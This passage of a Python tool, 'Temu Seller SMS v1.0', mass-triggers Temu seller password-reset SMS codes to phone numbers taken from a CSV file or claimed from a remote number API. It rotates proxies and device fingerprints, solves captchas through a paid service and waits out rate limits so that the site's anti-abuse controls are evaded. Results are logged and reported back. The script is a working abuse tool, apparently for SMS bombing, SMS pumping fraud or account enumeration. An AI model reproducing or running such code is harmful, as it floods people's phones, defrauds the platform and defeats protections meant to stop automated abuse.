            self, phone: str
    ) -> Tuple[str, str, str, Optional[str]]:
        masked = mask_phone(phone)
        session = await self._get_session()
        info = await self.hlr.lookup(
            session, phone)
        if not info:
            raise HLRError(
                'No data for ' + masked)
        log.info(
            '[%s] %s +%s (%s)',
            masked,
            info.country_name,
            info.country_prefix,
            info.carrier)
        proxy_url = await self.proxy.get(
            info.country_code)
        return (
            info.country_code,
            info.country_prefix,
            info.national_number,
            proxy_url)

    async def send_sms(
            self, phone: str
    ) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            'phone': phone,
            'status': 'fail',
            'error_code': 0,
            'timestamp': int(time.time()),
            'event': 'forget_password',
        }
        masked = mask_phone(phone)
        try:
            check_shutdown()
            (country, prefix,
             national, proxy_url) = (
                await self._setup_for_send(
                    phone))
            self._generate_fingerprint(country)
            captcha_attempts = 0
            for attempt in range(
                    self.config.max_retries):
                check_shutdown()
                if self.fingerprint.needs_rotation(
                        self.config
                        .requests_before_captcha):
                    log.info(
                        '[%s] Rotating'
                        ' fingerprint'
                        ' (used %d/%d)',
                        masked,
                        self.fingerprint
                        .request_count,
                        self.config
                        .requests_before_captcha)
                    self._rotate_fingerprint(
                        country)
                    proxy_url = (
                        await self.proxy.get(
                            country))
                self.fingerprint.record_use()
                region = self.fingerprint.region
                url = build_seller_url(
                    region,
                    '/api/user/forget/sendCode')
                body: Dict[str, Any] = {
                    'countryCode': prefix,
                    'mobile': national,
                    'type': 'forget_password',
                    'scene': (
                        'seller_forget_pwd'),
                    'lang': (
                        self.fingerprint.lang),
                    'region': region.upper(),
                    'platform': 'pc',
                    '_': str(int(
                        time.time() * 1000)),
                }
                if self.fingerprint.device_id:
                    body['device_id'] = (
                        self.fingerprint
                        .device_id)
                log.info(
                    '[%s] Sending attempt'
                    ' %d/%d (region=%s)',
                    masked,
                    attempt + 1,
                    self.config.max_retries,
                    region)
                try:
                    data = (
                        await self._request_json(
                            'POST', url,
                            json_body=body,
                            proxy_url=proxy_url,
                            phone=phone))
                except NetworkError as exc:
                    if exc.retryable:
                        await asyncio.sleep(
                            random.uniform(
                                self.config
                                .delay_min,
                                self.config
                                .delay_max))
                        continue
                    raise
                if (not data
                        or not isinstance(
                            data, dict)):
                    await asyncio.sleep(
                        random.uniform(
                            self.config
                            .delay_min,
                            self.config
                            .delay_max))
                    continue
                success = data.get('success')
                code = data.get('code', -1)
                msg = str(
                    data.get('msg',
                             data.get(
                                 'message',
                                 ''))).lower()
                if (success
                        or code == 0
                        or 'code sent' in msg
                        or 'verification code sent'
                        in msg):
                    log.info(
                        '[%s] OK SMS sent',
                        masked)
                    result['status'] = 'success'
                    result['error_code'] = 0
                    result['timestamp'] = int(
                        time.time())
                    return result
                if (code == TEMU_ERROR_CAPTCHA
                        or 'captcha' in msg):
                    captcha_attempts += 1
                    if (captcha_attempts
                            > MAX_CAPTCHA_ATTEMPTS):
                        raise CaptchaError(
                            'Captcha loop')
                    try:
                        solved = (
                            await
                            self._handle_captcha(
                                proxy_url,
                                phone))
                        if solved:
                            continue
                    except CaptchaError:
                        pass
                    self._rotate_fingerprint(
                        country)
                    proxy_url = (
                        await self.proxy.get(
                            country))
                    continue
                if (code == TEMU_ERROR_RATE_LIMIT
                        or 'rate limit' in msg
                        or 'too many' in msg
                        or 'too frequent'
                        in msg):
                    await self.limiter.slow_down()
                    cooldown = data.get(
                        'remaining_time',
                        self.config
                        .cooldown_seconds)
                    log.warning(
                        '[%s] Rate limited,'
                        ' waiting %.0fs',
                        masked, float(cooldown))
                    await asyncio.sleep(
                        float(cooldown))
                    self._rotate_fingerprint(
                        country)
                    proxy_url = (
                        await self.proxy.get(
                            country))
                    continue
                if (code == TEMU_ERROR_BLACKLIST
                        or 'blacklist' in msg
                        or 'blocked' in msg):
                    log.error(
                        '[%s] Number'
                        ' blacklisted',
                        masked)
                    result['error_code'] = (
                        TEMU_ERROR_BLACKLIST)
                    return result
                if ('invalid' in msg
                        or 'mobile' in msg):
                    log.error(
                        '[%s] Invalid number',
                        masked)
                    result['error_code'] = -2
                    return result
                raw_msg = data.get(
                    'msg',
                    data.get('message', ''))
                log.error(
                    '[%s] FAIL code=%s,'
                    ' msg=%s',
                    masked, code,
                    str(raw_msg)[:100])
                result['error_code'] = (
                    int(code)
                    if isinstance(code, int)
                    else -1)
                return result
            result['error_code'] = (
                ERR_MAX_RETRIES)
        except ShutdownError:
            result['error_code'] = ERR_SHUTDOWN
        except HLRError as exc:
            log.error(
                '[%s] HLR: %s', masked, exc)
            result['error_code'] = (
                ERR_HLR_FAILED)
        except CaptchaError as exc:
            log.error(
                '[%s] Captcha: %s',
                masked, exc)
            result['error_code'] = (
                ERR_CAPTCHA_LOOP)
        except NetworkError as exc:
            log.error(
                '[%s] Network: %s',
                masked, exc)
            result['error_code'] = (
                ERR_MAX_RETRIES)
        except Exception as exc:
            log.error(
                '[%s] %s: %s',
                masked,
                type(exc).__name__, exc)
            result['error_code'] = ERR_CRASH
        return result


# ============================================
#  RESULT WRITER
# ============================================

def read_numbers(path: str) -> List[str]:
    numbers = []
    with open(path, 'r') as f:
        for row in csv.reader(f):
            if row:
                num = row[0].strip()
                if (num
                        and not num.startswith(
                            '#')):
                    numbers.append(num)
    log.info(
        'Loaded %d from %s',
        len(numbers), path)
    return numbers


class ResultWriter:

    def __init__(
            self, success_path: str,
            fail_path: str):
        self._lock = asyncio.Lock()
        self._sp = success_path
        self._fp = fail_path
        self._sf = None
        self._ff = None
        self._sw = None
        self._fw = None
        self.success = 0
        self.fail = 0
        self._writes_since_fsync = 0

    def _open_sync(self) -> None:
        self._sf = open(
            self._sp, 'w', newline='')
        self._ff = open(
            self._fp, 'w', newline='')
        self._sw = csv.writer(self._sf)
        self._fw = csv.writer(self._ff)
        self._sw.writerow(
            ['phone', 'event', 'timestamp'])
        self._fw.writerow(
            ['phone', 'event', 'error_code',
             'timestamp'])
        self._sf.flush()
        self._ff.flush()
        os.fsync(self._sf.fileno())
        os.fsync(self._ff.fileno())

    async def open(self) -> None:
        await run_in_io(self._open_sync)

    def _write_sync(
            self, is_success: bool,
            row: list) -> None:
        if is_success:
            self._sw.writerow(row)
            self._sf.flush()
        else:
            self._fw.writerow(row)
            self._ff.flush()
        self._writes_since_fsync += 1
        if (self._writes_since_fsync
                >= FSYNC_INTERVAL):
            os.fsync(self._sf.fileno())
            os.fsync(self._ff.fileno())
            self._writes_since_fsync = 0

    async def write(
            self,
            result: Dict[str, Any]) -> None:
        async with self._lock:
            ok = (
                result['status'] == 'success')
            event = result.get(
                'event', 'unknown')
            if ok:
                row = [
                    result['phone'],
                    event,
                    result['timestamp']]
                self.success += 1
            else:
                row = [
                    result['phone'],
                    event,
                    result['error_code'],
                    result['timestamp']]
                self.fail += 1
            await run_in_io(
                self._write_sync, ok, row)
            total = self.success + self.fail
            if total % 25 == 0:
                log.info(
                    'Progress: %d,'
                    ' %d ok, %d fail',
                    total, self.success,
                    self.fail)

    def _close_sync(self) -> None:
        for f in (self._sf, self._ff):
            if f:
                try:
                    f.flush()
                    os.fsync(f.fileno())
                    f.close()
                except Exception:
                    pass

    async def close(self) -> None:
        await run_in_io(self._close_sync)

    def summary(self) -> None:
        total = self.success + self.fail
        rate = (
            (self.success / total * 100)
            if total > 0 else 0)
        log.info(
            'DONE: %d total, %d ok (%.1f%%),'
            ' %d fail',
            total, self.success, rate,
            self.fail)


# ============================================
#  RESOURCE GUARD
# ============================================

class ResourceGuard:

    def __init__(self):
        self._writer: Optional[
            ResultWriter] = None
        self._connector: Optional[
            aiohttp.TCPConnector] = None
        self._sessions: List[
            aiohttp.ClientSession] = []

    def register(
            self,
            writer: Optional[
                ResultWriter] = None,
            connector: Optional[
                aiohttp.TCPConnector] = None,
            session: Optional[
                aiohttp.ClientSession] = None
    ) -> None:
        if writer:
            self._writer = writer
        if connector:
            self._connector = connector
        if session:
            self._sessions.append(session)

    async def cleanup(self) -> None:
        log.info('Cleaning up...')
        if self._writer:
            try:
                self._writer.summary()
                await self._writer.close()
            except Exception as exc:
                log.error(
                    'Writer: %s', exc)
        for s in self._sessions:
            if s and not s.closed:
                try:
                    await s.close()
                except Exception:
                    pass
        if (self._connector
                and not
                self._connector.closed):
            try:
                await self._connector.close()
            except Exception:
                pass


# ============================================
#  BATCHED TASK RUNNER
# ============================================

async def run_batched(
        items: List[Any], worker,
        batch_size: int = TASK_BATCH_SIZE
) -> int:
    total = len(items)
    processed = 0
    for start in range(0, total, batch_size):
        if shutdown_event.is_set():
            break
        batch = items[start:start + batch_size]
        tasks = [
            asyncio.create_task(worker(item))
            for item in batch
            if not shutdown_event.is_set()]
        if tasks:
            done, _ = await asyncio.wait(
                tasks,
                return_when=(
                    asyncio.ALL_COMPLETED))
            for t in done:
                exc = t.exception()
                if exc and not isinstance(
                        exc, (
                            ShutdownError,
                            asyncio
                            .CancelledError)):
                    log.error(
                        'Task: %s', exc)
            processed += len(done)
    return processed


# ============================================
#  BATCH RESULTS COLLECTOR
# ============================================

@dataclass
class BatchCollector:
    results: List[dict] = field(
        default_factory=list)
    lock: asyncio.Lock = field(
        default_factory=asyncio.Lock)

    async def add(
            self, entry: dict) -> None:
        async with self.lock:
            self.results.append(entry)


# ============================================
#  PROCESS CSV
# ============================================

async def process_csv(
        config: AppConfig,
        numbers: List[str],
        proxies: Optional[List[str]] = None,
        threads: int = 5,
        success_file: str = 'success.csv',
        fail_file: str = 'failed.csv'
) -> None:
    config.validate('csv')
    writer = ResultWriter(
        success_file, fail_file)
    await writer.open()
    connector = aiohttp.TCPConnector(
        limit=threads * 3,
        enable_cleanup_closed=True)
    guard = ResourceGuard()
    guard.register(
        writer=writer,
        connector=connector)
    sem = asyncio.Semaphore(threads)
    captcha = CaptchaSolver(config)
    hlr = HLRLookup(config)
    proxy_mgr = ProxyManager(proxies)
    limiter = RateLimiter(
        config.global_rps,
        config.global_burst)
    if captcha.has_key:
        async with aiohttp.ClientSession() as cs:
            bal = await captcha.check_balance(cs)
            if bal == 0:
                log.error('Captcha balance 0')
                await guard.cleanup()
                return
        log.info('Captcha solver: enabled')
    else:
        log.info(
            'Captcha solver: disabled'
            ' (no sadcaptcha_key).'
            ' Rotating fingerprint as'
            ' fallback.')
    log.info(
        'Mode: CSV, %d numbers, %d threads',
        len(numbers), threads)
    try:
        async def worker(
                phone: str) -> None:
            if shutdown_event.is_set():
                return
            async with sem:
                if shutdown_event.is_set():
                    return
                async with TemuSMS(
                    config, connector,
                    proxy_mgr, captcha,
                    hlr, limiter
                ) as client:
                    result = (
                        await client.send_sms(
                            phone))
                    await writer.write(result)
                await asyncio.sleep(
                    random.uniform(
                        config.delay_min,
                        config.delay_max))
        await run_batched(numbers, worker)
    except asyncio.CancelledError:
        log.info('CSV cancelled')
    except Exception as exc:
        log.error('CSV: %s', exc)
    finally:
        await guard.cleanup()


# ============================================
#  PROCESS API
# ============================================

async def process_api(
        config: AppConfig,
        proxies: Optional[List[str]] = None,
        threads: int = 5,
        claim_count: int = 10,
        lease_seconds: int = 600,
        success_file: str = 'success.csv',
        fail_file: str = 'failed.csv'
) -> None:
    config.validate('api')
    writer = ResultWriter(
        success_file, fail_file)
    await writer.open()
    connector = aiohttp.TCPConnector(
        limit=threads * 3,
        enable_cleanup_closed=True)
    guard = ResourceGuard()
    guard.register(
        writer=writer,
        connector=connector)
    sem = asyncio.Semaphore(threads)
    captcha = CaptchaSolver(config)
    hlr = HLRLookup(config)
    proxy_mgr = ProxyManager(proxies)
    limiter = RateLimiter(
        config.global_rps,
        config.global_burst)
    number_api = NumberAPI(config)
    if captcha.has_key:
        async with aiohttp.ClientSession() as cs:
            bal = await captcha.check_balance(cs)
            if bal == 0:
                log.error('Captcha balance 0')
                await guard.cleanup()
                return
        log.info('Captcha solver: enabled')
    else:
        log.info(
            'Captcha solver: disabled'
            ' (no sadcaptcha_key).'
            ' Rotating fingerprint as'
            ' fallback.')
    log.info(
        'Mode: API, claim=%d, threads=%d',
        claim_count, threads)
    total_claimed = 0
    batch_num = 0
    empty_streak = 0
    api_session = aiohttp.ClientSession(
        connector=connector,
        connector_owner=False)
    guard.register(session=api_session)
    try:
        while not shutdown_event.is_set():
            batch_num += 1
            try:
                cd = await number_api.claim(
                    api_session,
                    claim_count,
                    lease_seconds)
            except (
                NetworkError, AppError
            ) as exc:
                log.error('Claim: %s', exc)
                empty_streak += 1
                if (empty_streak
                        >= MAX_EMPTY_CLAIMS):
                    break
                await asyncio.sleep(
                    min(
                        2 ** empty_streak,
                        30))
                continue
            if (not cd
                    or not cd.get('items')):
                empty_streak += 1
                if (empty_streak
                        >= MAX_EMPTY_CLAIMS):
                    break
                await asyncio.sleep(
                    min(
                        2 ** empty_streak,
                        30))
                continue
            empty_streak = 0
            claim_id = cd.get('claimId', '')
            items = cd['items']
            total_claimed += len(items)
            collector = BatchCollector()

            async def worker(
                    item: dict) -> None:
                if shutdown_event.is_set():
                    return
                phone = item['phone']
                nid = item['id']
                async with sem:
                    if shutdown_event.is_set():
                        return
                    async with TemuSMS(
                        config, connector,
                        proxy_mgr, captcha,
                        hlr, limiter
                    ) as client:
                        result = (
                            await client
                            .send_sms(phone))
                        await writer.write(
                            result)
                    entry: Dict[str, Any] = {
                        'id': nid,
                        'status':
                            result['status']}
                    if (result['status']
                            == 'fail'):
                        entry['note'] = (
                            'ec='
                            + str(result[
                                'error_code']))
                    await collector.add(entry)

            await run_batched(items, worker)
            if (collector.results
                    and not
                    shutdown_event.is_set()):
                try:
                    await number_api.report(
                        api_session,
                        claim_id,
                        collector.results)
                except (
                    NetworkError, AppError
                ) as exc:
                    log.warning(
                        'Report: %s', exc)
            await asyncio.sleep(
                random.uniform(1.0, 3.0))
        log.info(
            'Total claimed: %d',
            total_claimed)
    except asyncio.CancelledError:
        log.info('API cancelled')
    except Exception as exc:
        log.error('API: %s', exc)
    finally:
        await guard.cleanup()


# ============================================
#  CLI
# ============================================

def parse_proxies(
        proxy_arg: Optional[str] = None,
        proxy_file: Optional[str] = None
) -> Optional[List[str]]:
    proxies: List[str] = []
    if proxy_arg:
        proxies.append(proxy_arg)
    if (proxy_file
            and os.path.exists(proxy_file)):
        with open(proxy_file, 'r') as f:
            for line in f:
                s = line.strip()
                if s and not s.startswith('#'):
                    proxies.append(s)
    return proxies if proxies else None


def main():
    _setup_signals()
    parser = argparse.ArgumentParser(
        description='Temu Seller SMS v1.0')
    source = (
        parser
        .add_mutually_exclusive_group(
            required=True))
    source.add_argument(
        '--input', '-i', default=None,
        help='CSV file with phone numbers')
    source.add_argument(
        '--api', action='store_true',
        help='Use Number API for input')
    parser.add_argument(
        '--success', '-s',
        default='success.csv',
        help='Success output CSV')
    parser.add_argument(
        '--fail', '-f',
        default='failed.csv',
        help='Failure output CSV')
    parser.add_argument(
        '--proxy', '-p', default=None,
        help='Single proxy '
             '(user:pass@host:port)')
    parser.add_argument(
        '--proxy-file', default=None,
        help='File with proxy list')
    parser.add_argument(
        '--threads', '-t',
        type=int, default=5,
        help='Concurrent threads')
    parser.add_argument(
        '--config', '-c',
        default='config.json',
        help='Config JSON path')
    parser.add_argument(
        '--claim-count',
        type=int, default=None,
        help='Numbers per API claim')
    parser.add_argument(
        '--lease-seconds',
        type=int, default=None,
        help='Lease duration for API')
    parser.add_argument(
        '--rps', type=float, default=None,
        help='Global rate limit (req/s)')
    parser.add_argument(
        '--region', default=None,
        choices=list(TEMU_REGIONS),
        help='Default Temu region')
    args = parser.parse_args()
    config = load_config(args.config)
    overrides: Dict[str, Any] = {}
    if args.rps is not None:
        overrides['global_rps'] = args.rps
    if args.region is not None:
        overrides['default_region'] = (
            args.region)
    if overrides:
        config = config.with_overrides(
            **overrides)
    proxies = parse_proxies(
        args.proxy, args.proxy_file)
    cc = (
        args.claim_count
        if args.claim_count is not None
        else config.claim_count)
    ls = (
        args.lease_seconds
        if args.lease_seconds is not None
        else config.lease_seconds)
    if proxies:
        log.info('Proxies: %d', len(proxies))
    log.info(
        'Default region: %s,'
        ' RPS: %.1f,'
        ' max_retries: %d,'
        ' cooldown: %.0fs',
        config.default_region,
        config.global_rps,
        config.max_retries,
        config.cooldown_seconds)
    if not config.sadcaptcha_key:
        log.warning(
            'No sadcaptcha_key.'
            ' Requests limited to ~%d'
            ' per fingerprint before'
            ' captcha block.',
            config.requests_before_captcha)
    try:
        if args.api:
            asyncio.run(process_api(
                config, proxies,
                args.threads,
                cc, ls,
                args.success,
                args.fail))
        else:
            numbers = read_numbers(
                args.input)
            if not numbers:
                log.error('No numbers')
                sys.exit(1)
            asyncio.run(process_csv(
                config, numbers, proxies,
                args.threads,
                args.success,
                args.fail))
    except ConfigError as exc:
        log.error('Config: %s', exc)
        sys.exit(1)


if __name__ == '__main__':
    main()